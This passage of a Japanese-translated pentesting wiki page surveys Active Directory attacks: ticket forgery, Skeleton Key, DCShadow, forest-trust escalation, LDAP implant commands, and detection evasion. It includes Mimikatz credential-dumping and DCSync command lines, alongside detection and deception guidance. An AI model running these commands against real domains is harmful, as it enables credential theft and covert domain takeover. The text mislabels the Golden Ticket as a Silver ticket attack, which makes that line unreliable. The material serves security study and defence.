{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** は、attacker が Active Directory (AD) 環境で **krbtgt account の NTLM hash** への access を得ることを指します。この account は、AD network 内での認証に不可欠な、すべての **Ticket Granting Tickets (TGTs)** に署名するため特別です。

attacker がこの hash を入手すると、任意の account の **TGTs** を作成できます（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これは、**一般的な golden tickets の検出メカニズムを回避**するように作られた golden tickets のようなものです。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**ある account の certificates を持っている、または要求できる** ことは、その user account に持続的に残るための非常に良い方法です（password を変更されても）:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**certificates を使うことで、domain 内で高権限を維持することも可能です:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory の **AdminSDHolder** object は、標準の **Access Control List (ACL)** をこれらの privileged groups に適用することで、**privileged groups**（Domain Admins や Enterprise Admins など）の security を確保し、未許可の変更を防ぎます。しかし、この機能は悪用できます。attacker が AdminSDHolder の ACL を変更して通常 user にフルアクセスを与えると、その user はすべての privileged groups を広範に制御できるようになります。保護のためのこの security measure は、適切に監視されていなければ、かえって不正な access を許してしまう可能性があります。

[**AdminDSHolder Group の詳細はこちら。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての **Domain Controller (DC)** には、**local administrator** account が存在します。そのような machine で admin 権限を得ると、**mimikatz** を使って local Administrator hash を抽出できます。その後、この password の使用を **enable** するために registry の変更が必要で、これにより local Administrator account へ remote access できるようになります。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

ある特定の domain object に対して、ある **user** に **special permissions** を与えることで、将来その user が **権限昇格** できるようにできます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** は、object が別の object に対して持つ **permissions** を **保存**するために使われます。object の security descriptor に少し変更を加えるだけで、privileged group の member でなくても、その object に対して非常に興味深い権限を得られます。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class を abuse して、`entryTTL`/`msDS-Entry-Time-To-Die` を持つ短命な principals/GPOs/DNS records を作成します。これらは tombstones を残さず自動削除され、LDAP の痕跡を消しつつ、孤立した SIDs、壊れた `gPLink` references、またはキャッシュされた DNS responses（例: AdminSDHolder ACE pollution や malicious `gPCFileSysPath`/AD-integrated DNS redirects）を残します。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

memory 上の **LSASS** を改変して、すべての domain accounts へ access できる **universal password** を確立します。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider) とは何かはこちら。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
自分専用の **SSP** を作成して、machine への access に使われた credentials を **clear text** で **capture** できます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD 内に **新しい Domain Controller** を登録し、それを使って指定された object に対し **attributes を push**（SIDHistory, SPNs...）しますが、**変更に関する logs を一切残しません**。**DA** 権限が必要で、**root domain** 内にいる必要があります。\
間違った data を使うと、かなりひどい logs が出ます。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

以前、**LAPS passwords を読むのに十分な権限**があれば権限昇格できる方法を説明しました。しかし、これらの passwords は **persistence の維持**にも使えます。\
確認してください:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft は **Forest** を security boundary と見なしています。つまり、**1つの domain を compromise すると、Forest 全体が compromise される可能性がある**ということです。

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) は、ある **domain** の user が別の **domain** の resources に access できるようにする security mechanism です。これは本質的に 2 つの domain の authentication system をつなぎ、authentication verification がシームレスに流れるようにします。domain が trust を設定すると、それぞれの **Domain Controllers (DCs)** 内で特定の **keys** を交換・保持し、これが trust の integrity にとって重要です。

典型的なシナリオでは、user が **trusted domain** 内の service に access したい場合、まず自分の domain の DC に対して **inter-realm TGT** と呼ばれる特別な ticket を要求する必要があります。この TGT は、両方の domain が合意した共有 **key** で暗号化されます。次に user はこの TGT を **trusted domain の DC** に提示し、service ticket（**TGS**）を取得します。trusted domain の DC が inter-realm TGT を正常に検証すると、TGS を発行し、user にその service への access を与えます。

**手順**:

1. **Domain 1** の **client computer** が、自身の **NTLM hash** を使って **Ticket Granting Ticket (TGT)** を **Domain Controller (DC1)** に要求することから始まります。
2. DC1 は client の認証が成功すると、新しい TGT を発行します。
3. 次に client は、**Domain 2** の resources に access するために必要な **inter-realm TGT** を DC1 に要求します。
4. inter-realm TGT は、2-way domain trust の一部として DC1 と DC2 が共有する **trust key** で暗号化されます。
5. client は inter-realm TGT を **Domain 2 の Domain Controller (DC2)** に持っていきます。
6. DC2 は共有された trust key を使って inter-realm TGT を検証し、有効であれば、client が access したい Domain 2 の server 向けの **Ticket Granting Service (TGS)** を発行します。
7. 最後に client はこの TGS を server に提示し、server の account hash で暗号化されたそれを使って、Domain 2 の service へ access します。

### Different trusts

**trust は 1-way または 2-way** である点に注意してください。2-way の場合、両方の domain が互いを trust しますが、**1-way** の trust では、一方の domain が **trusted**、もう一方が **trusting** domain になります。この場合、**trusted 側から trusting domain 内の resources のみに access できます**。

Domain A が Domain B を trust している場合、A は trusting domain で、B は trusted domain です。さらに、**Domain A** ではこれは **Outbound trust**、**Domain B** では **Inbound trust** になります。

**Different trusting relationships**

- **Parent-Child Trusts**: 同じ forest 内でよくある構成で、child domain は親 domain と自動的に 2-way の transitive trust を持ちます。つまり、authentication requests は親と child の間をシームレスに流れます。
- **Cross-link Trusts**: "shortcut trusts" とも呼ばれ、referral process を高速化するために child domains 間で確立されます。複雑な forest では、authentication referrals は通常 forest root まで上がってから target domain へ下る必要があります。cross-links を作ることで経路が短縮され、地理的に分散した環境で特に有利です。
- **External Trusts**: これは互いに無関係な別々の domains 間に設定され、性質上 non-transitive です。[Microsoft の documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) によると、external trusts は forest trust でつながっていない current forest 外の domain の resources へ access するのに有用です。external trusts では SID filtering により security が強化されます。
- **Tree-root Trusts**: これらは forest root domain と新たに追加された tree root の間に自動的に確立されます。一般的にはあまり見かけませんが、tree-root trusts は新しい domain trees を forest に追加し、それらが固有の domain name を維持しつつ 2-way transitivity を確保するうえで重要です。詳細は [Microsoft の guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) を参照してください。
- **Forest Trusts**: これは 2 つの forest root domains 間の 2-way transitive trust であり、SID filtering も強制して security measures を強化します。
- **MIT Trusts**: これは Windows 以外の、[RFC4120-compliant](https://tools.ietf.org/html/rfc4120) な Kerberos domains と確立される trust です。MIT trusts はやや特殊で、Windows エコシステム外の Kerberos ベース systems との統合が必要な環境向けです。

#### Other differences in **trusting relationships**

- trust relationship は **transitive**（A trust B, B trust C なら A trust C）にも **non-transitive** にもなります。
- trust relationship は **bidirectional trust**（双方が互いを trust）としても、**one-way trust**（一方だけが他方を trust）としても設定できます。

### Attack Path

1. trusting relationships を **enumerate** する
2. 何らかの **security principal**（user/group/computer）が **other domain の resources** に access できるか確認する。ACE entry や other domain の group への所属による場合もあります。**domains をまたぐ relationships** を探してください（おそらくそのために trust が作られています）。
1. この場合、kerberoast も別の option になり得ます。
3. domains をまたいで **pivot** できる **accounts** を **compromise** する。

Attacker は、他の domain の resources にアクセスするために、主に 3 つの mechanism を使えます:

- **Local Group Membership**: principal は server の “Administrators” group のような machine 上の local groups に追加されることがあり、その machine に対して強い control を得られます。
- **Foreign Domain Group Membership**: principal は foreign domain 内の groups の member にもなれます。ただし、この method の効果は trust の性質と group の scope に依存します。
- **Access Control Lists (ACLs)**: principal は **ACL** 内、特に **DACL** 内の **ACEs** として指定されることがあり、特定の resources への access を提供します。ACL、DACL、ACEs の仕組みをさらに深く知りたい人には、"[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)" という whitepaper が非常に役立ちます。

### Find external users/groups with permissions

domain 内の foreign security principals を見つけるには、**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** を確認できます。これらは **external domain/forest** の user/group です。

これを **Bloodhound** か powerview で確認できます:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### 子から親への forest 権限昇格
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメイン trust を列挙する他の方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2つのtrusted keys**があり、1つは_Child --> Parent_用、もう1つは_Parent_ --> _Child_用です。\
> 現在のdomainで使われているものは次で確認できます:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection を使って trust を悪用し、child/parent domain から Enterprise admin へ escalation します:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) をどう悪用できるかを理解することは重要です。Configuration NC は、Active Directory (AD) 環境における forest 全体の configuration data の central repository として機能します。この data は forest 内のすべての Domain Controller (DC) に replicated され、writable DC は Configuration NC の writable copy を保持します。これを悪用するには、**DC 上で SYSTEM privileges** が必要です。できれば child DC が望ましいです。

**Link GPO to root DC site**

Configuration NC の Sites container には、AD forest 内の domain-joined computers すべての sites に関する情報が含まれます。任意の DC で SYSTEM privileges を使って操作することで、attackers は GPO を root DC sites に link できます。この操作により、これらの sites に適用される policies を操作して root domain を compromise できる可能性があります。

詳細は [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) の research を参照してください。

**Compromise any gMSA in the forest**

attack vector の1つは、domain 内の privileged gMSA を target にすることです。gMSA の passwords を計算するために必要な KDS Root key は、Configuration NC 内に保存されています。任意の DC で SYSTEM privileges があれば、KDS Root key にアクセスし、forest 全体の任意の gMSA の password を算出できます。

詳細な analysis と step-by-step guidance は以下で確認できます:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補完的な delegated MSA attack (BadSuccessor – migration attributes の abuse):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

追加の external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

この method には patience が必要で、新しい privileged AD objects の creation を待ちます。SYSTEM privileges があれば、attacker は AD Schema を modify して、任意の user にすべての classes への complete control を付与できます。これにより、新しく作成された AD objects への unauthorized access と control が可能になります。

さらに読むには [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent) を参照してください。

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability は、Public Key Infrastructure (PKI) objects の control を target にし、forest 内の任意の user として authentication できる certificate template を作成します。PKI objects は Configuration NC に存在するため、writable child DC を compromise すると ESC5 attacks を実行できます。

詳細は [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) を参照してください。ADCS がないシナリオでは、attacker は必要な components を set up できます。これは [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) で説明されています。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは、**あなたのドメインは信頼されている** が、外部ドメインに対して **未定義の権限** を与えられています。あなたは、**自分のドメインのどのプリンシパルが外部ドメイン上のどのアクセス権を持っているか** を見つけ、その後それを悪用できるか試す必要があります:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
このシナリオでは、**your domain** が **different domains** の principal に対していくつかの **privileges** を **trusting** しています。

しかし、**domain is trusted** されると、trusted domain は **予測可能な名前** を持つ **user** を作成し、その **password** として **trusted password** を使用します。つまり、**trusting domain** の user にアクセスして **trusted one** に入り込み、列挙して、さらに多くの権限昇格を試みることが可能です:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain を侵害する別の方法は、domain trust の **逆方向** に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることです（これはあまり一般的ではありません）。

trusted domain を侵害する別の方法は、**trusted domain の user がアクセスできる** マシンで待機し、**RDP** 経由でログインさせることです。すると、攻撃者は RDP session process に code を注入し、そこから **victim の origin domain** にアクセスできます。\
さらに、もし **victim が自分の hard drive を mount** していれば、**RDP session** process から攻撃者は hard drive の **startup folder** に **backdoors** を保存できます。この technique は **RDPInception** と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- forest trust をまたぐ SID history attribute を利用した attacks の risk は、SID Filtering によって軽減されます。SID Filtering は、すべての inter-forest trusts でデフォルトで有効です。これは、Microsoft の立場に従い、security boundary を domain ではなく forest とみなすことで、intra-forest trusts は secure であるという前提に基づいています。
- ただし注意点として、SID filtering は applications と user access を妨げる可能性があり、そのため無効化されることがあります。

### **Selective Authentication:**

- inter-forest trusts では、Selective Authentication を使用することで、2つの forests の users が自動的に authenticated されないようにできます。代わりに、users が trusting domain または forest 内の domains や servers にアクセスするには、明示的な permissions が必要です。
- なお、これらの対策は writable Configuration Naming Context (NC) の exploitation や trust account への attacks からは保護しない点に注意してください。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は、bloodyAD 風の LDAP primitives を x64 Beacon Object Files として再実装したもので、on-host implant（例: Adaptix C2）内で完全に動作します。Operator は `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` で pack をコンパイルし、`ldap.axs` を load してから、beacon から `ldap <subcommand>` を呼び出します。すべての traffic は、現在の logon security context を LDAP (389) over で signing/sealing あり、または LDAPS (636) over で auto certificate trust ありの状態で流れるため、socks proxies や disk artifacts は不要です。

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` は、short names/OU paths を full DNs に解決し、対応する objects をダンプします。
- `get-object`, `get-attribute`, and `get-domaininfo` は、任意の attributes（security descriptors を含む）と、`rootDSE` から forest/domain metadata を取得します。
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` は、roasting candidates、delegation settings、既存の [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors を LDAP から直接公開します。
- `get-acl` と `get-writable --detailed` は DACL を解析し、trustees、rights（GenericAll/WriteDACL/WriteOwner/attribute writes）、および inheritance を列挙して、ACL privilege escalation の即時ターゲットを示します。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### 権限昇格と永続化のためのLDAP書き込みプリミティブ

- Object creation BOFs（`add-user`、`add-computer`、`add-group`、`add-ou`）は、OU権限がある場所ならどこでも新しいprincipalやmachine accountを配置できる。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は、write-property権限が見つかった時点で対象を直接乗っ取る。
- `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync` のようなACL重視のコマンドは、任意のADオブジェクトに対する WriteDACL/WriteOwner を、PowerShell/ADSIの痕跡を残さずにパスワードリセット、グループメンバーシップ制御、または DCSync replication 権限へ変換する。`remove-*` 対応コマンドは注入したACEを削除する。

### Delegation、roasting、Kerberos abuse

- `add-spn`/`set-spn` は、侵害済みユーザーを即座に Kerberoastable にする。`add-asreproastable`（UAC切り替え）は、パスワードに触れずに AS-REP roasting 対象としてマークする。
- Delegation マクロ（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は、ビーコンから `msDS-AllowedToDelegateTo`、UACフラグ、または `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換え、constrained/unconstrained/RBCD attack path を有効化し、リモートPowerShellやRSATを不要にする。

### sidHistory injection、OU移動、attack surface の調整

- `add-sidhistory` は、制御下のprincipalの SID history に特権SIDを注入する（[SID-History Injection](sid-history-injection.md) を参照）。これにより、LDAP/LDAPSだけで stealthy に access inheritance を得られる。
- `move-object` はコンピュータやユーザーのDN/OUを変更し、攻撃者が `set-password`、`add-groupmember`、`add-spn` を悪用する前に、既に delegated rights があるOUへ asset を移動できる。
- 厳密にスコープされた削除コマンド（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` など）は、オペレータが credential や persistence を回収した後に迅速な rollback を可能にし、telemetry を最小化する。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御

[**資格情報を保護する方法の詳細はこちら。**](../stealing-credentials/credentials-protections.md)

### **資格情報保護のための防御策**

- **Domain Admins の制限**: Domain Admins は Domain Controllers にのみログインを許可し、他のホストでの利用は避けるべきである。
- **Service Account の権限**: セキュリティ維持のため、Service は Domain Admin（DA）権限で実行すべきではない。
- **一時的な権限制限**: DA権限が必要な作業では、その有効時間を制限する。例: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay の緩和**: Event ID 2889/3074/3075 を監査し、その後 DC/client で LDAP signing と LDAPS channel binding を強制して LDAP MITM/relay 試行をブロックする。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity のプロトコルレベル fingerprinting

一般的な AD tradecraft を検知したい場合、リネームされた binary、service name、一時的な batch file、出力パスのような **オペレータが制御する artifact だけに依存しない**。正規の Windows client が [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC、WMI traffic をどう生成するかをベースライン化し、そのうえで、オペレータが `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py`、`ntlmrelayx.py` を編集した後でも残る **implementation quirks** を探す。

- **高い信頼度の単独候補**（自分のベースラインで検証した後）:
- `auth_context_id = 79231 + ctx_id` を使う authenticated DCE/RPC
- `0xff` で埋められた DCE/RPC authentication padding
- 生の Kerberos `AP-REQ` を SPNEGO の `mechToken` に直接置く LDAP Kerberos bind
- ASCII風の `ClientGuid` 値を持つ SMB2/3 negotiate request
- 非標準 namespace `//./root/cimv2` を使う WMI `IWbemLevel1Login::NTLMLogin`
- ハードコードされた Kerberos nonce 値
- **correlation/scoring feature として使う方がよい**:
- 疎または重複した Kerberos etype list、異常または欠落した `PA-DATA`、あるいは native Windows と異なる TGS-REQ の etype ordering
- version 情報のない NTLM Type 1 message、または null host name を含む Type 3 message
- SPNEGO の代わりに DCE/RPC で運ばれる raw NTLMSSP、欠落した DCE/RPC verification trailer、または SPNEGO/Kerberos OID の不一致
- 同じ host/user/session/time window からこれらの特性が複数見つかる場合、単一の弱い field よりはるかに強い
- **単独アラートではなく enrichment として使う**:
- デフォルトの filename、出力パス、ランダムな service name、一時的な batch name、デフォルトの computer account name、tool 固有の HTTP/WebDAV/RDP/MSSQL 文字列
- これらはオペレータが変更しやすく、クロスプロトコル cluster が suspicious である理由を説明する用途に最適
- **運用上の注意**:
- 一部の signal には、復号済み traffic、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW、または service-side visibility が必要
- alert に昇格する前に、Samba/Linux client、appliance、legacy software を使って検証する
- ベースラインへの確信を高めながら、検知を enrichment -> hunting -> alerting の順に昇格させる

### **Deception Technique の実装**

- Deception の実装では、decoy user や computer のような罠を作り、password が期限切れにならない、または Trusted for Delegation としてマークされているといった feature を持たせる。詳細な手法としては、特定の権限を持つユーザーを作成したり、高権限グループに追加したりする。
- 実践例としては、次のような tool を使う: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception technique の展開については [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) を参照。

### **Deception の識別**

- **User Object の場合**: 疑わしい指標には、非典型的な ObjectSID、ログオン頻度の低さ、作成日時、bad password count の少なさが含まれる。
- **一般的な指標**: 潜在的な decoy object の属性を本物のものと比較すると、不整合を見つけられる。 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) のような tool は、このような deception の識別に役立つ。

### **検知システムの回避**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA 検知を避けるため、Domain Controllers 上で session enumeration を行わない。
- **Ticket Impersonation**: **aes** keys を ticket 作成に使うと、NTLM へダウングレードせずに検知を回避しやすい。
- **DCSync Attacks**: ATA 検知を避けるため、Domain Controller 以外から実行することが推奨される。Domain Controller から直接実行すると alert を引き起こす。

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)

{{#include ../../banners/hacktricks-training.md}}
